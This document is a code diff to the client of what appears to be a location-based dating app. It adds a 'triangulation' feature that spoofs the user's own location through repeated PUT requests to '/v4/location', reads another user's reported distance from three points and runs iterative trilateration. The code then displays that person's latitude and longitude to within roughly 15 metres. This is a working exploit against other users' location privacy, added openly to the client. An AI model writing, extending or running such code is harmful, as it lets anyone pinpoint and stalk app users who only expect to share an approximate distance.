@@ -8,6 +8,8 @@ import {
 import z from "zod";
 import toast from "react-hot-toast";
 import { useApiFunctions } from "../../hooks/useApiFunctions";
+import { usePreferences } from "../../contexts/PreferencesContext";
+import { decodeGeohash, encodeGeohash } from "../../utils/geohash";
 import { validateMediaHash } from "../../utils/media";
 import { ProfileDetailsModal } from "./gridpage/components/ProfileDetailsModal";
 import {
@@ -34,6 +36,7 @@ export function GridProfilePage() {
 	const params = useParams();
 	const [searchParams] = useSearchParams();
 	const apiFunctions = useApiFunctions();
+	const { geohash } = usePreferences();
 	const [activeProfile, setActiveProfile] = useState<ProfileDetail | null>(
 		null,
 	);
@@ -253,6 +256,147 @@ export function GridProfilePage() {
 		navigate(`/chat?${nextParams.toString()}`);
 	};
 
+    const solveTrilateration = (points: { lat: number, lon: number, dist: number }[]) => {
+        // 1. Convert Lat/Lon to a simple XY grid (meters) relative to the first point
+        // This avoids floating point errors with large coordinate numbers
+        const p1 = points[0];
+        const p2 = points[1];
+        const p3 = points[2];
+
+        // Rough conversion: 1 degree lat = 111320m
+        const latToM = 111320;
+        const lonToM = 111320 * Math.cos(p1.lat * (Math.PI / 180));
+
+        const x2 = (p2.lon - p1.lon) * lonToM;
+        const y2 = (p2.lat - p1.lat) * latToM;
+        const x3 = (p3.lon - p1.lon) * lonToM;
+        const y3 = (p3.lat - p1.lat) * latToM;
+
+        const r1 = p1.dist;
+        const r2 = p2.dist;
+        const r3 = p3.dist;
+
+        // 2. Standard Trilateration Formula for 2D intersection
+        // Derived from (x-x1)^2 + (y-y1)^2 = r1^2 ... etc
+        const A = 2 * x2;
+        const B = 2 * y2;
+        const C = Math.pow(r1, 2) - Math.pow(r2, 2) + Math.pow(x2, 2) + Math.pow(y2, 2);
+        const D = 2 * x3;
+        const E = 2 * y3;
+        const F = Math.pow(r1, 2) - Math.pow(r3, 2) + Math.pow(x3, 2) + Math.pow(y3, 2);
+
+        const x = (C * E - F * B) / (A * E - D * B);
+        const y = (A * F - D * C) / (A * E - D * B);
+
+        // 3. Convert XY back to Lat/Lon
+        return {
+            lat: p1.lat + (y / latToM),
+            lon: p1.lon + (x / lonToM)
+        };
+    };
+
+    const handleTriangleProfile = async (targetProfileId: string) => {
+        if (!geohash) {
+            toast.error("Set your browse location first");
+            return;
+        }
+
+        // Decode starting position
+        const decoded = decodeGeohash(geohash);
+        const originalLat = (decoded.lat[0] + decoded.lat[1]) / 2;
+        const originalLon = (decoded.lon[0] + decoded.lon[1]) / 2;
+
+        const waitMs = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));
+
+        const putServerLocation = async (lat: number, lon: number, targetGeohash: string) => {
+            const payloads = [
+                { lat, lon },
+                { latitude: lat, longitude: lon },
+                { geohash: targetGeohash },
+                { nearbyGeoHash: targetGeohash },
+            ];
+
+            for (const payload of payloads) {
+                try {
+                    const response = await apiFunctions.request("/v4/location", {
+                        method: "PUT",
+                        body: payload,
+                    });
+                    if (response.status >= 200 && response.status < 300) return;
+                } catch (e) {
+                    continue; 
+                }
+            }
+            throw new Error("Failed to update server location across all payload types.");
+        };
+
+        const getDistanceFromProfile = async (): Promise<number | null> => {
+            try {
+                const profile = await apiFunctions.getProfileDetail(targetProfileId);
+                return typeof profile.distance === "number" && Number.isFinite(profile.distance)
+                    ? profile.distance
+                    : null;
+            } catch {
+                return null;
+            }
+        };
+
+        try {
+            const initialDist = await getDistanceFromProfile();
+            if (initialDist === null) {
+                toast.error("Could not retrieve target distance.");
+                return;
+            }
+
+            let currentLat = originalLat;
+            let currentLon = originalLon;
+            const targetPrecision = 15; 
+            let rounds = Math.ceil(Math.log(initialDist / targetPrecision) / Math.log(3));
+            rounds = Math.max(2, Math.min(rounds, 6));
+
+            // Degrees per meter (approximate)
+            let offset = (initialDist*1.5) / 111320;
+
+            toast.success(`Target distance: ${Math.round(initialDist)}m. Starting ${rounds} triangulation rounds.`);
+
+            for (let i = 0; i < rounds; i++) {
+                const points = [
+                    { lat: currentLat + offset, lon: currentLon }, // Top
+                    { lat: currentLat - (offset / 2), lon: currentLon + (offset * 0.866) }, // Bottom Right
+                    { lat: currentLat - (offset / 2), lon: currentLon - (offset * 0.866) }, // Bottom Left
+                ];
+
+                const results: { lat: number, lon: number, dist: number }[] = [];
+                
+                for (const p of points) {
+                    await putServerLocation(p.lat, p.lon, encodeGeohash(p.lat, p.lon));
+                    await waitMs(5000); // Wait for distance calculation to propagate on server
+                    const d = await getDistanceFromProfile();
+                    if (d !== null) results.push({ lat: p.lat, lon: p.lon, dist: d });
+                }
+
+                if (results.length === 3) {
+                    const estimate = solveTrilateration(results);
+                    currentLat = estimate.lat;
+                    currentLon = estimate.lon;
+                    offset /= 3; // Zoom in for the next round
+
+                    toast.success(`Round ${i + 1} complete. ${currentLat}, ${currentLon}. Estimated distance: ~${Math.round(results[0].dist)}m.`);
+                    
+                    toast.success(`Round ${i + 1} complete. Estimated error: ~${Math.round(offset * 111320)}m`);
+                }
+            }
+
+            toast.success("The user is at approximately lat:" + currentLat + ", lon:" + currentLon + ". Estimated error: ~" + Math.round(offset * 111320) + " meters from the final estimated location.");
+        } catch (error) {
+            toast.error(error instanceof Error ? error.message : "An error occurred during triangulation");
+        } finally {
+            // Optional: Uncomment if you want to jump back to original spot after 10 seconds
+            await waitMs(10000);
+            await putServerLocation(originalLat, originalLon, geohash);
+        }
+    };
+
 	const handleTapProfile = async (targetProfileId: string) => {
 		if (isTappingProfile) {
 			return;
@@ -289,6 +433,7 @@ export function GridProfilePage() {
 				navigate(safeReturnTo, { replace: true });
 			}}
 			onMessageProfile={handleMessageProfile}
+			onTriangleProfile={handleTriangleProfile}
 			onTapProfile={handleTapProfile}
 			isTappingProfile={isTappingProfile}
 			isTapBlocked={hasSentTapRecently}
